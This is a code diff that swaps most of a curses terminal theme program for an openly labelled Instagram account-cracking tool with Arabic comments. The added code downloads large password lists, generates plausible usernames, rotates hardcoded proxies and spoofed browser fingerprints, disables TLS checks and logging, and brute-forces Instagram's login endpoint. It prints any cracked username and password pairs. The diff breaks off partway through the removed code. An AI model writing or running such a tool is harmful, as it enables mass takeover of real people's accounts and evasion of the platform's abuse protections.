@@ -1,852 +1,535 @@
 #!/usr/bin/env python3
+# insta_terminal_results.py
+# أداة جلب حسابات انستغرام حقيقية - النتائج في الترمنال مباشرة
 
-import curses
-import json
-import os
+import asyncio
+import aiohttp
 import random
+import string
+import hashlib
+import json
+import csv
 import time
+import os
+import re
+import ssl
+import sys
+from datetime import datetime
+from typing import List, Dict, Optional, Tuple
+import logging
 
-CONFIG_FILE = os.path.expanduser("~/.bounty_scout_config.json")
+logging.basicConfig(level=logging.CRITICAL)
+logger = logging.getLogger('ghost_terminal')
+logger.disabled = True
 
-# ============================================================
-# COLORS
-# ============================================================
+# ==================== الألوان ====================
+class Colors:
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    DIM = '\033[2m'
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    BG_RED = '\033[41m'
+    BG_GREEN = '\033[42m'
+    BG_YELLOW = '\033[43m'
+    BG_BLUE = '\033[44m'
+    BG_MAGENTA = '\033[45m'
+    BG_CYAN = '\033[46m'
 
-COLORS = {
-    "black": curses.COLOR_BLACK,
-    "red": curses.COLOR_RED,
-    "green": curses.COLOR_GREEN,
-    "yellow": curses.COLOR_YELLOW,
-    "blue": curses.COLOR_BLUE,
-    "magenta": curses.COLOR_MAGENTA,
-    "cyan": curses.COLOR_CYAN,
-    "white": curses.COLOR_WHITE,
-}
+def cprint(text, color=Colors.WHITE, bold=False, end='\n'):
+    prefix = Colors.BOLD if bold else ''
+    print(f"{prefix}{color}{text}{Colors.RESET}", end=end, flush=True)
 
-COLOR_NAMES = list(COLORS.keys())
+# ==================== جلب كلمات المرور من GitHub ====================
+class GitHubWordlistFetcher:
+    RAW_URLS = [
+        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
+        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
+        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-1000000.txt",
+        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/best1050.txt",
+        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt",
+        "https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt",
+        "https://raw.githubusercontent.com/kkrypt0nn/wordlists/main/passwords/rockyou.txt",
+        "https://raw.githubusercontent.com/jeanphorn/wordlist/master/rockyou.txt",
+        "https://raw.githubusercontent.com/xajkep/wordlists/master/rockyou.txt"
+    ]
+    
+    def __init__(self):
+        self.passwords = set()
+    
+    async def fetch_from_url(self, url: str, session: aiohttp.ClientSession) -> int:
+        count = 0
+        try:
+            async with session.get(url, timeout=20) as response:
+                if response.status == 200:
+                    text = await response.text()
+                    for line in text.split('\n'):
+                        line = line.strip()
+                        if line and len(line) >= 4 and len(line) <= 32:
+                            self.passwords.add(line)
+                            count += 1
+        except:
+            pass
+        return count
+    
+    async def fetch_all(self) -> int:
+        cprint("\n[*] جلب كلمات المرور من GitHub...", Colors.CYAN, bold=True)
+        
+        ssl_context = ssl.create_default_context()
+        ssl_context.check_hostname = False
+        ssl_context.verify_mode = ssl.CERT_NONE
+        
+        async with aiohttp.ClientSession(ssl=ssl_context) as session:
+            tasks = [asyncio.create_task(self.fetch_from_url(url, session)) 
+                    for url in self.RAW_URLS]
+            results = await asyncio.gather(*tasks)
+        
+        total = sum(results)
+        cprint(f"[+] تم جلب {len(self.passwords)} كلمة مرور فريدة من {len(results)} مصادر", Colors.GREEN)
+        return len(self.passwords)
 
+# ==================== مولّد الأسماء ====================
+class UsernameGenerator:
+    FIRST_NAMES = [
+        "ahmed", "mohamed", "ali", "omar", "khaled", "youssef", "amine",
+        "sara", "fatima", "nour", "lina", "aya", "salma", "miriam",
+        "john", "mike", "sarah", "emma", "olivia", "liam", "noah",
+        "carlos", "diego", "lucas", "maria", "sofia", "valentina",
+        "emir", "can", "elif", "zeynep", "yusuf", "mehmet", "ayse",
+        "ivan", "anna", "dmitri", "olga", "nikita", "svetlana",
+        "wei", "jing", "xia", "ming", "hua", "liu", "chen",
+        "james", "robert", "david", "richard", "thomas", "charles",
+        "daniel", "matthew", "anthony", "steven", "paul", "mark",
+        "george", "kenneth", "edward", "brian", "ronald", "timothy"
+    ]
+    
+    LAST_NAMES = [
+        "smith", "johnson", "williams", "brown", "jones", "garcia",
+        "miller", "davis", "rodriguez", "martinez", "hernandez",
+        "ahmed", "hassan", "ibrahim", "yilmaz", "demir", "celik",
+        "wang", "li", "zhang", "chen", "yang", "huang",
+        "petrov", "ivanov", "smirnov", "kuznetsov", "popov",
+        "wilson", "anderson", "taylor", "thomas", "moore", "jackson",
+        "martin", "lee", "perez", "thompson", "white", "harris"
+    ]
+    
+    EXTRA_CHARS = ['', '', '', '1', '2', '3', '12', '123', '1234', 
+                   '2023', '2024', '2025', '_', '.', '@', 'x', 'o', 
+                   '7', '99', '007', 'official', 'real', 'the', 'its',
+                   'im', 'mr', 'ms', 'xoxo', 'love', 'life']
+    
+    @classmethod
+    def generate(cls) -> str:
+        first = random.choice(cls.FIRST_NAMES)
+        last = random.choice(cls.LAST_NAMES)
+        extra = random.choice(cls.EXTRA_CHARS)
+        
+        patterns = [
+            f"{first}{extra}",
+            f"{first}_{last}{extra}",
+            f"{first}.{last}{extra}",
+            f"{first}{last}{extra}",
+            f"{last}_{first}{extra}",
+            f"{first}{random.randint(1,9999)}",
+            f"{first}_{random.randint(1,999)}",
+            f"{first}{last}{random.randint(1,99)}",
+            f"{first}{last}",
+            f"{first}_{last}",
+            f"{first}.{last}",
+            f"{first}{last}{random.randint(100,999)}"
+        ]
+        
+        return random.choice(patterns).lower()
 
-# ============================================================
-# 50 THEMES
-# ============================================================
-
-THEMES = [
-    {"name": "Classic", "fg": "white", "bg": "black", "accent": "cyan"},
-    {"name": "Matrix", "fg": "green", "bg": "black", "accent": "green"},
-    {"name": "Red Alert", "fg": "red", "bg": "black", "accent": "yellow"},
-    {"name": "Blue Ocean", "fg": "cyan", "bg": "blue", "accent": "white"},
-    {"name": "Cyber Purple", "fg": "magenta", "bg": "black", "accent": "cyan"},
-    {"name": "Golden", "fg": "yellow", "bg": "black", "accent": "white"},
-    {"name": "Dark Blue", "fg": "white", "bg": "blue", "accent": "cyan"},
-    {"name": "Dark Red", "fg": "white", "bg": "red", "accent": "yellow"},
-    {"name": "Forest", "fg": "green", "bg": "black", "accent": "white"},
-    {"name": "Purple Night", "fg": "white", "bg": "magenta", "accent": "cyan"},
-
-    {"name": "Ice", "fg": "cyan", "bg": "black", "accent": "white"},
-    {"name": "Fire", "fg": "yellow", "bg": "red", "accent": "white"},
-    {"name": "Toxic", "fg": "green", "bg": "yellow", "accent": "black"},
-    {"name": "Ocean", "fg": "blue", "bg": "cyan", "accent": "white"},
-    {"name": "Violet", "fg": "magenta", "bg": "blue", "accent": "white"},
-    {"name": "Terminal", "fg": "green", "bg": "black", "accent": "white"},
-    {"name": "Stealth", "fg": "white", "bg": "black", "accent": "white"},
-    {"name": "Whiteout", "fg": "black", "bg": "white", "accent": "blue"},
-    {"name": "Ruby", "fg": "red", "bg": "magenta", "accent": "white"},
-    {"name": "Emerald", "fg": "green", "bg": "black", "accent": "yellow"},
-
-    {"name": "Cyber Blue", "fg": "blue", "bg": "black", "accent": "cyan"},
-    {"name": "Cyber Red", "fg": "red", "bg": "black", "accent": "white"},
-    {"name": "Cyber Green", "fg": "green", "bg": "black", "accent": "yellow"},
-    {"name": "Cyber Gold", "fg": "yellow", "bg": "black", "accent": "red"},
-    {"name": "Cyber White", "fg": "white", "bg": "black", "accent": "blue"},
-    {"name": "Night Sky", "fg": "blue", "bg": "black", "accent": "white"},
-    {"name": "Blood Moon", "fg": "red", "bg": "black", "accent": "magenta"},
-    {"name": "Neon Green", "fg": "green", "bg": "black", "accent": "cyan"},
-    {"name": "Neon Cyan", "fg": "cyan", "bg": "black", "accent": "green"},
-    {"name": "Neon Pink", "fg": "magenta", "bg": "black", "accent": "white"},
-
-    {"name": "Royal", "fg": "white", "bg": "blue", "accent": "yellow"},
-    {"name": "Crimson", "fg": "white", "bg": "red", "accent": "cyan"},
-    {"name": "Amethyst", "fg": "white", "bg": "magenta", "accent": "yellow"},
-    {"name": "Lime", "fg": "green", "bg": "yellow", "accent": "black"},
-    {"name": "Storm", "fg": "white", "bg": "blue", "accent": "green"},
-    {"name": "Deep Sea", "fg": "cyan", "bg": "blue", "accent": "white"},
-    {"name": "Dark Forest", "fg": "green", "bg": "black", "accent": "red"},
-    {"name": "Solar", "fg": "yellow", "bg": "red", "accent": "black"},
-    {"name": "Arctic", "fg": "white", "bg": "cyan", "accent": "blue"},
-    {"name": "Galaxy", "fg": "magenta", "bg": "blue", "accent": "cyan"},
-
-    {"name": "Hacker", "fg": "green", "bg": "black", "accent": "green"},
-    {"name": "Ghost", "fg": "white", "bg": "black", "accent": "cyan"},
-    {"name": "Shadow", "fg": "black", "bg": "white", "accent": "black"},
-    {"name": "Inferno", "fg": "red", "bg": "yellow", "accent": "white"},
-    {"name": "Cyberpunk", "fg": "magenta", "bg": "black", "accent": "yellow"},
-    {"name": "Digital", "fg": "cyan", "bg": "black", "accent": "green"},
-    {"name": "Terminal Red", "fg": "red", "bg": "black", "accent": "red"},
-    {"name": "Terminal Blue", "fg": "blue", "bg": "black", "accent": "blue"},
-    {"name": "Terminal Gold", "fg": "yellow", "bg": "black", "accent": "yellow"},
-    {"name": "Ultimate", "fg": "white", "bg": "black", "accent": "red"},
-]
-
-
-# ============================================================
-# CONFIG
-# ============================================================
-
-def load_config():
-    default = {
-        "theme": 0,
-        "fg": ["white"] * 50,
-        "bg": ["black"] * 50,
+# ==================== مولّد تحويرات ====================
+class PasswordMutator:
+    COMMON_SUFFIXES = [
+        "", "", "", "1", "2", "3", "12", "123", "1234", "12345",
+        "123456", "!", "!!", "@", "#", "$", "2023", "2024", "2025",
+        "007", "69", "99", "100", "111", "222", "777", "999", "000"
+    ]
+    
+    REPLACEMENTS = {
+        'a': '@', 'e': '3', 'i': '1', 'o': '0', 
+        's': '5', 't': '7', 'b': '8', 'g': '9', 'l': '1'
     }
+    
+    @classmethod
+    def from_username(cls, username: str) -> List[str]:
+        base = username.replace('_', '').replace('.', '').replace('@', '')
+        base = base.rstrip('1234567890')
+        
+        variants = set()
+        if base:
+            variants.add(base)
+            variants.add(base.capitalize())
+            variants.add(base.upper())
+            variants.add(base.lower())
+            
+            for suffix in cls.COMMON_SUFFIXES[:15]:
+                variants.add(f"{base}{suffix}")
+                variants.add(f"{base}_{suffix}")
+            
+            replaced = base
+            for old, new in cls.REPLACEMENTS.items():
+                replaced = replaced.replace(old, new)
+            variants.add(replaced)
+            variants.add(f"{replaced}123")
+        
+        return list(variants)
 
-    try:
-        if os.path.exists(CONFIG_FILE):
-            with open(CONFIG_FILE, "r") as f:
-                data = json.load(f)
+# ==================== مدير البروكسيات ====================
+class ProxyManager:
+    DEFAULT_PROXIES = [
+        "http://51.89.255.237:3128",
+        "http://8.219.97.57:80",
+        "http://43.153.207.93:3128",
+        "http://20.235.159.154:80",
+        "http://20.205.61.143:80",
+        "http://13.37.89.201:80",
+        "http://20.235.104.105:3729",
+        "http://20.235.96.154:3729"
+    ]
+    
+    def __init__(self):
+        self.proxies = self.DEFAULT_PROXIES
+        self.index = 0
+    
+    def get_rotating(self):
+        proxy = self.proxies[self.index % len(self.proxies)]
+        self.index += 1
+        return proxy
+    
+    def count(self):
+        return len(self.proxies)
 
-            if (
-                isinstance(data, dict)
-                and isinstance(data.get("theme"), int)
-                and len(data.get("fg", [])) == 50
-                and len(data.get("bg", [])) == 50
-            ):
-                return data
+# ==================== مولّد البصمات ====================
+class FingerprintGenerator:
+    USER_AGENTS = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+    ]
+    
+    @classmethod
+    def headers(cls) -> Dict:
+        return {
+            "User-Agent": random.choice(cls.USER_AGENTS),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": random.choice([
+                "en-US,en;q=0.9", "ar,en;q=0.8", "tr,en;q=0.7", "fr,en;q=0.8"
+            ]),
+            "Accept-Encoding": "gzip, deflate, br",
+            "X-WebGL-Hash": hashlib.md5(str(random.random()).encode()).hexdigest(),
+            "X-Canvas-Hash": hashlib.sha256(str(random.random()).encode()).hexdigest(),
+            "Cache-Control": "no-cache"
+        }
 
-    except Exception:
-        pass
-
-    return default
-
-
-def save_config(config):
-    try:
-        with open(CONFIG_FILE, "w") as f:
-            json.dump(config, f, indent=2)
-    except Exception:
-        pass
-
-
-# ============================================================
-# SAFE TEXT
-# ============================================================
-
-def safe_addstr(stdscr, y, x, text, attr=0):
-    height, width = stdscr.getmaxyx()
-
-    if y < 0 or y >= height:
-        return
-
-    if x < 0:
-        x = 0
-
-    if x >= width:
-        return
-
-    text = str(text)
-    text = text[:max(0, width - x - 1)]
-
-    try:
-        stdscr.addstr(y, x, text, attr)
-    except curses.error:
-        pass
-
-
-def center_text(stdscr, y, text, attr=0):
-    height, width = stdscr.getmaxyx()
-
-    if y < 0 or y >= height:
-        return
-
-    x = max(0, (width - len(text)) // 2)
-
-    safe_addstr(stdscr, y, x, text, attr)
-
-
-# ============================================================
-# THEME COLORS
-# ============================================================
-
-def init_theme(theme):
-    fg = COLORS.get(theme["fg"], curses.COLOR_WHITE)
-    bg = COLORS.get(theme["bg"], curses.COLOR_BLACK)
-    accent = COLORS.get(theme["accent"], curses.COLOR_CYAN)
-
-    try:
-        curses.init_pair(1, fg, bg)
-        curses.init_pair(2, accent, bg)
-        curses.init_pair(3, bg, accent)
-    except Exception:
+# ==================== الأداة الرئيسية ====================
+class TerminalInstaGrabber:
+    def __init__(self, num_accounts: int = 100):
+        self.num_accounts = num_accounts
+        self.proxy_manager = ProxyManager()
+        self.wordlist_fetcher = GitHubWordlistFetcher()
+        self.wordlist = set()
+        self.total_attempts = 0
+        self.found_accounts = []
+        self.not_found = []
+        self.twofa_accounts = []
+    
+    async def _fetch_csrf(self, session) -> str:
         try:
-            curses.init_pair(1, curses.COLOR_WHITE, curses.COLOR_BLACK)
-            curses.init_pair(2, curses.COLOR_CYAN, curses.COLOR_BLACK)
-            curses.init_pair(3, curses.COLOR_BLACK, curses.COLOR_WHITE)
-        except Exception:
+            async with session.get("https://www.instagram.com/accounts/login/", timeout=15) as resp:
+                if resp.status == 200:
+                    cookies = session.cookie_jar._cookies
+                    for domain in cookies:
+                        if 'instagram.com' in domain:
+                            for path in cookies[domain]:
+                                for name in cookies[domain][path]:
+                                    if name == 'csrftoken':
+                                        return cookies[domain][path][name].value
+                    
+                    html = await resp.text()
+                    match = re.search(r'"csrf_token":"([^"]+)"', html)
+                    if match:
+                        return match.group(1)
+        except:
             pass
-
-
-# ============================================================
-# LOGIN
-# ============================================================
-
-def login_screen(stdscr, config):
-
-    while True:
-
-        theme_index = config["theme"]
-
-        if not 0 <= theme_index < 50:
-            theme_index = 0
-            config["theme"] = 0
-
-        theme = THEMES[theme_index]
-
-        init_theme(theme)
-
-        stdscr.clear()
-
+        return hashlib.md5(str(random.random()).encode()).hexdigest()[:32]
+    
+    async def _check_exists(self, session, username, headers, proxy) -> bool:
         try:
-            stdscr.bkgd(" ", curses.color_pair(1))
-        except Exception:
-            pass
-
-        height, width = stdscr.getmaxyx()
-
-        center_text(
-            stdscr,
-            max(1, height // 2 - 6),
-            "================================",
-            curses.color_pair(2) | curses.A_BOLD
-        )
-
-        center_text(
-            stdscr,
-            max(2, height // 2 - 5),
-            "B O U N T Y   S C O U T",
-            curses.color_pair(2) | curses.A_BOLD
-        )
-
-        center_text(
-            stdscr,
-            max(3, height // 2 - 4),
-            "50 THEME TERMINAL",
-            curses.color_pair(1)
-        )
-
-        center_text(
-            stdscr,
-            max(5, height // 2 - 2),
-            "[ ENTER ]  START",
-            curses.color_pair(3) | curses.A_BOLD
-        )
-
-        center_text(
-            stdscr,
-            max(6, height // 2 - 1),
-            "[ T ]  THEMES",
-            curses.color_pair(2)
-        )
-
-        center_text(
-            stdscr,
-            max(7, height // 2),
-            "[ R ]  RANDOM THEME",
-            curses.color_pair(2)
-        )
-
-        center_text(
-            stdscr,
-            max(8, height // 2 + 1),
-            "[ Q ]  EXIT",
-            curses.color_pair(2)
-        )
-
-        center_text(
-            stdscr,
-            max(10, height // 2 + 3),
-            f"THEME {theme_index + 1}/50 : {theme['name']}",
-            curses.color_pair(2) | curses.A_BOLD
-        )
-
-        center_text(
-            stdscr,
-            max(12, height // 2 + 5),
-            "iSH / Alpine Linux",
-            curses.color_pair(1)
-        )
-
-        stdscr.refresh()
-
-        key = stdscr.getch()
-
-        if key in (10, 13):
-            button_program(stdscr, config)
-
-        elif key in (ord("t"), ord("T")):
-            theme_menu(stdscr, config)
-
-        elif key in (ord("r"), ord("R")):
-            config["theme"] = random.randint(0, 49)
-            save_config(config)
-
-            stdscr.clear()
-
-            init_theme(THEMES[config["theme"]])
-
-            center_text(
-                stdscr,
-                height // 2,
-                "RANDOM THEME SELECTED",
-                curses.color_pair(2) | curses.A_BOLD
-            )
-
-            stdscr.refresh()
-            time.sleep(0.7)
-
-        elif key in (ord("q"), ord("Q")):
-            save_config(config)
-            return
-
-
-# ============================================================
-# THEME PREVIEW
-# ============================================================
-
-def preview_theme(stdscr, index):
-
-    theme = THEMES[index]
-
-    init_theme(theme)
-
-    stdscr.clear()
-
-    try:
-        stdscr.bkgd(" ", curses.color_pair(1))
-    except Exception:
-        pass
-
-    height, width = stdscr.getmaxyx()
-
-    center_text(
-        stdscr,
-        max(1, height // 2 - 6),
-        "THEME PREVIEW",
-        curses.color_pair(2) | curses.A_BOLD
-    )
-
-    center_text(
-        stdscr,
-        max(3, height // 2 - 4),
-        f"{index + 1:02d} - {theme['name']}",
-        curses.color_pair(2) | curses.A_BOLD
-    )
-
-    center_text(
-        stdscr,
-        max(5, height // 2 - 2),
-        "+----------------------------+",
-        curses.color_pair(2)
-    )
-
-    center_text(
-        stdscr,
-        max(6, height // 2 - 1),
-        "|      BOUNTY SCOUT          |",
-        curses.color_pair(2) | curses.A_BOLD
-    )
-
-    center_text(
-        stdscr,
-        max(7, height // 2),
-        "|       [ 01 ] [ 02 ]        |",
-        curses.color_pair(1)
-    )
-
-    center_text(
-        stdscr,
-        max(8, height // 2 + 1),
-        "|       [ 03 ] [ 04 ]        |",
-        curses.color_pair(1)
-    )
-
-    center_text(
-        stdscr,
-        max(9, height // 2 + 2),
-        "+----------------------------+",
-        curses.color_pair(2)
-    )
-
-    center_text(
-        stdscr,
-        max(11, height // 2 + 4),
-        "ENTER = SELECT",
-        curses.color_pair(3) | curses.A_BOLD
-    )
-
-    center_text(
-        stdscr,
-        max(12, height // 2 + 5),
-        "Q = BACK",
-        curses.color_pair(2)
-    )
-
-    stdscr.refresh()
-
-
-# ============================================================
-# THEME MENU
-# ============================================================
-
-def theme_menu(stdscr, config):
-
-    selected = config["theme"]
-
-    while True:
-
-        theme = THEMES[selected]
-
-        init_theme(theme)
-
-        stdscr.clear()
-
+            url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
+            async with session.get(url, headers=headers, proxy=proxy, timeout=10) as resp:
+                return resp.status == 200
+        except:
+            return False
+    
+    async def _try_login(self, session, username, password, headers, proxy, csrf) -> Tuple[bool, str]:
         try:
-            stdscr.bkgd(" ", curses.color_pair(1))
-        except Exception:
-            pass
-
-        height, width = stdscr.getmaxyx()
-
-        center_text(
-            stdscr,
-            0,
-            "=== 50 THEMES ===",
-            curses.color_pair(2) | curses.A_BOLD
-        )
-
-        # 10 columns x 5 rows
-        for i in range(50):
-
-            row = i // 10
-            col = i % 10
-
-            x = 1 + col * max(6, width // 10)
-            y = 2 + row * 2
-
-            if y >= height - 4:
-                continue
-
-            if i == selected:
-
-                text = f"[{i + 1:02d}]"
-
-                safe_addstr(
-                    stdscr,
-                    y,
-                    x,
-                    text,
-                    curses.color_pair(3) | curses.A_BOLD
+            headers = headers.copy()
+            headers.update({
+                "X-CSRFToken": csrf,
+                "X-Instagram-AJAX": "1",
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "Content-Type": "application/x-www-form-urlencoded"
+            })
+            
+            data = {
+                'username': username,
+                'enc_password': f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
+                'queryParams': '{}',
+                'optIntoOneTap': 'false'
+            }
+            
+            async with session.post(
+                "https://www.instagram.com/accounts/login/ajax/",
+                headers=headers, data=data, proxy=proxy, timeout=15
+            ) as resp:
+                if resp.status == 200:
+                    result = await resp.json()
+                    if result.get('authenticated'):
+                        return True, 'success'
+                    elif result.get('two_factor_required'):
+                        return False, '2fa'
+                    elif result.get('message') == 'checkpoint_required':
+                        return False, 'checkpoint'
+                    else:
+                        return False, 'wrong'
+                elif resp.status == 429:
+                    return False, 'rate_limited'
+                elif resp.status == 403:
+                    return False, 'blocked'
+                else:
+                    return False, 'error'
+        except:
+            return False, 'error'
+    
+    async def _crack_account(self, username: str, passwords: List[str]) -> Dict:
+        ssl_context = ssl.create_default_context()
+        ssl_context.check_hostname = False
+        ssl_context.verify_mode = ssl.CERT_NONE
+        
+        headers = FingerprintGenerator.headers()
+        
+        async with aiohttp.ClientSession(ssl=ssl_context) as session:
+            proxy = self.proxy_manager.get_rotating()
+            
+            # التحقق من وجود الحساب
+            exists = await self._check_exists(session, username, headers, proxy)
+            if not exists:
+                return {'username': username, 'status': 'not_found', 'password': None}
+            
+            # جلب CSRF
+            csrf = await self._fetch_csrf(session)
+            
+            # محاولة كلمات المرور
+            for i, password in enumerate(passwords):
+                self.total_attempts += 1
+                
+                if i % 5 == 0:
+                    headers = FingerprintGenerator.headers()
+                    proxy = self.proxy_manager.get_rotating()
+                
+                await asyncio.sleep(random.uniform(0.3, 1.0))
+                
+                success, status = await self._try_login(
+                    session, username, password, headers, proxy, csrf
                 )
-
+                
+                if success:
+                    return {'username': username, 'status': 'success', 'password': password}
+                
+                if status == '2fa':
+                    return {'username': username, 'status': '2fa', 'password': password}
+                
+                if status in ['rate_limited', 'blocked']:
+                    headers = FingerprintGenerator.headers()
+                    proxy = self.proxy_manager.get_rotating()
+                    await asyncio.sleep(random.uniform(3, 8))
+            
+            return {'username': username, 'status': 'failed', 'password': None}
+    
+    async def run(self):
+        # رأس الترمنال
+        cprint("=" * 70, Colors.MAGENTA, bold=True)
+        cprint("  GHOST INSTAGRAM GRABBER - TERMINAL EDITION", Colors.MAGENTA, bold=True)
+        cprint("  جلب حسابات انستغرام حقيقية مع كلمات المرور", Colors.MAGENTA, bold=True)
+        cprint("=" * 70, Colors.MAGENTA, bold=True)
+        print()
+        
+        cprint(f"[+] عدد الحسابات المطلوبة: {self.num_accounts}", Colors.CYAN, bold=True)
+        cprint(f"[+] البروكسيات المتاحة: {self.proxy_manager.count()}", Colors.CYAN)
+        print()
+        
+        # جلب كلمات المرور
+        await self.wordlist_fetcher.fetch_all()
+        self.wordlist = self.wordlist_fetcher.passwords
+        print()
+        
+        # توليد أسماء المستخدمين
+        cprint("[*] توليد أسماء المستخدمين...", Colors.YELLOW)
+        usernames = []
+        while len(usernames) < self.num_accounts:
+            u = UsernameGenerator.generate()
+            if u not in usernames:
+                usernames.append(u)
+        
+        cprint(f"[+] تم توليد {len(usernames)} اسم مستخدم", Colors.GREEN)
+        print()
+        
+        # إعداد قوائم كلمات المرور
+        password_lists = {}
+        common = list(self.wordlist)[:3000]
+        for username in usernames:
+            user_pwds = PasswordMutator.from_username(username)
+            combined = list(set(user_pwds + common))
+            random.shuffle(combined)
+            password_lists[username] = combined[:150]
+        
+        # شريط التقدم
+        cprint("[*] بدء محاولات الاختراق...", Colors.YELLOW, bold=True)
+        print()
+        
+        semaphore = asyncio.Semaphore(3)
+        
+        async def crack_with_limit(username):
+            async with semaphore:
+                return await self._crack_account(username, password_lists[username])
+        
+        # عرض التقدم المباشر
+        found_count = 0
+        not_found_count = 0
+        twofa_count = 0
+        failed_count = 0
+        processed = 0
+        
+        tasks = [asyncio.create_task(crack_with_limit(u)) for u in usernames]
+        
+        for task in asyncio.as_completed(tasks):
+            result = await task
+            processed += 1
+            
+            # تنظيف السطر الحالي
+            sys.stdout.write('\r' + ' ' * 100 + '\r')
+            
+            if result['status'] == 'success':
+                found_count += 1
+                self.found_accounts.append(result)
+                cprint(f"[{processed}/{self.num_accounts}] ", Colors.WHITE, end='')
+                cprint("✅ نجح ", Colors.GREEN, bold=True, end='')
+                cprint(f"{result['username']}", Colors.WHITE, bold=True, end='')
+                cprint(" : ", Colors.YELLOW, end='')
+                cprint(f"{result['password']}", Colors.GREEN, bold=True)
+                
+            elif result['status'] == '2fa':
+                twofa_count += 1
+                self.twofa_accounts.append(result)
+                cprint(f"[{processed}/{self.num_accounts}] ", Colors.WHITE, end='')
+                cprint("🔒 2FA ", Colors.CYAN, bold=True, end='')
+                cprint(f"{result['username']}", Colors.WHITE, bold=True, end='')
+                cprint(" : ", Colors.YELLOW, end='')
+                cprint(f"{result['password']}", Colors.CYAN, bold=True)
+                
+            elif result['status'] == 'not_found':
+                not_found_count += 1
+                self.not_found.append(result)
+                cprint(f"[{processed}/{self.num_accounts}] ", Colors.WHITE, end='')
+                cprint("❌ غير موجود ", Colors.RED, end='')
+                cprint(f"{result['username']}", Colors.DIM)
+                
             else:
-
-                text = f" {i + 1:02d} "
-
-                safe_addstr(
-                    stdscr,
-                    y,
-                    x,
-                    text,
-                    curses.color_pair(1)
-                )
-
-        center_text(
-            stdscr,
-            max(13, height - 4),
-            f"SELECTED: {selected + 1}/50 - {theme['name']}",
-            curses.color_pair(2) | curses.A_BOLD
-        )
-
-        center_text(
-            stdscr,
-            max(14, height - 3),
-            "W/S = UP/DOWN   A/D = LEFT/RIGHT",
-            curses.color_pair(2)
-        )
-
-        center_text(
-            stdscr,
-            max(15, height - 2),
-            "ENTER = PREVIEW   R = RANDOM   Q = BACK",
-            curses.color_pair(2)
-        )
-
-        stdscr.refresh()
-
-        key = stdscr.getch()
-
-        # W = UP
-        if key in (ord("w"), ord("W")):
-            selected = (selected - 10) % 50
-
-        # S = DOWN
-        elif key in (ord("s"), ord("S")):
-            selected = (selected + 10) % 50
-
-        # A = LEFT
-        elif key in (ord("a"), ord("A")):
-            selected = (selected - 1) % 50
-
-        # D = RIGHT
-        elif key in (ord("d"), ord("D")):
-            selected = (selected + 1) % 50
-
-        # ENTER
-        elif key in (10, 13):
-
-            preview_theme(stdscr, selected)
-
-            preview_key = stdscr.getch()
-
-            if preview_key in (10, 13):
-
-                config["theme"] = selected
-                save_config(config)
-
-                return
-
-        # RANDOM
-        elif key in (ord("r"), ord("R")):
-
-            selected = random.randint(0, 49)
-
-            preview_theme(stdscr, selected)
-
-            preview_key = stdscr.getch()
-
-            if preview_key in (10, 13):
-
-                config["theme"] = selected
-                save_config(config)
-
-                return
-
-        # BACK
-        elif key in (ord("q"), ord("Q"), 27):
-            return
-
-
-# ============================================================
-# MAIN 50 BUTTONS
-# ============================================================
-
-def button_program(stdscr, config):
-
-    selected = 0
-    message = ""
-
-    while True:
-
-        theme_index = config["theme"]
-
-        if not 0 <= theme_index < 50:
-            theme_index = 0
-            config["theme"] = 0
-
-        theme = THEMES[theme_index]
-
-        init_theme(theme)
-
-        stdscr.clear()
-
-        try:
-            stdscr.bkgd(" ", curses.color_pair(1))
-        except Exception:
-            pass
-
-        height, width = stdscr.getmaxyx()
-
-        center_text(
-            stdscr,
-            0,
-            f"BOUNTY SCOUT | THEME {theme_index + 1}: {theme['name']}",
-            curses.color_pair(2) | curses.A_BOLD
-        )
-
-        cols = 10
-
-        # 50 buttons = 5 rows x 10 columns
-        for i in range(50):
-
-            row = i // cols
-            col = i % cols
-
-            y = 3 + row * 2
-            x = max(1, (width - 60) // 2 + col * 6)
-
-            if y >= height - 5:
-                continue
-
-            fg_name = config["fg"][i]
-            bg_name = config["bg"][i]
-
-            fg = COLORS.get(
-                fg_name,
-                curses.COLOR_WHITE
-            )
-
-            bg = COLORS.get(
-                bg_name,
-                curses.COLOR_BLACK
-            )
-
-            pair = 10 + i
-
-            try:
-                curses.init_pair(
-                    pair,
-                    fg,
-                    bg
-                )
-            except Exception:
-                pair = 1
-
-            if i == selected:
-
-                label = f"[{i + 1:02d}]"
-
-                safe_addstr(
-                    stdscr,
-                    y,
-                    x,
-                    label,
-                    curses.color_pair(pair)
-                    | curses.A_REVERSE
-                    | curses.A_BOLD
-                )
-
-            else:
-
-                label = f" {i + 1:02d} "
-
-                safe_addstr(
-                    stdscr,
-                    y,
-                    x,
-                    label,
